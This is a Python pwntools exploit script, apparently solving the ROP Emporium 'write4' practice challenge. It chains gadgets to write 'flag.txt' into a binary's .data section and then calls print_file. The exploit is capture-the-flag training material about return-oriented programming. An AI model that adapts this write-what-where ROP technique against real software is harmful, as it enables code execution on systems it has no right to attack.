#!/usr/bin/env python3
from pwn import *

# This is used to simply write R15 to wherever R14 points.
write_gadget = p64(0x00400628) # moves R15 into R14

# This will put what's on the stack into r14 and r15.
pop_r14_r15 = p64(0x00400690) # Pop r14; pop r15

# Print file. This goes through the PLT entry of write4, as we don't
# necessarally know where our library gets loaded.
print_file = p64(0x00400510)

# This is used to get the pointer that contains the 
# file name onto the stack.
pop_rdi = p64(0x00400693)

# The location we are goign to write the string "flag.txt" to.
# This just so happens to be the .data section which
# isn't used for anything but is 0x10 bytes in size.
write_loc = 0x00601028

gen = cyclic_gen()
data = gen.get(40)

context.terminal = ["tmux", "splitw", "-h"]

def write_what_where(what, where):
    """
    Creates a rop chain that will write 8 bytes to a particular location.
    """
    data = b""
    data += pop_r14_r15
    data += p64(where)
    data += what
    data += write_gadget
    return data

data += write_what_where(b"flag.txt", write_loc)
data += pop_rdi
data += p64(write_loc)
data += print_file

# Unneeded, used for debugging.
#p = gdb.debug("./write4", """
#break main
#continue
#break *0x00400690
#continue
#""")
p = process("./write4")
p.readuntil(b"> ")
p.sendline(data)
p.interactive()

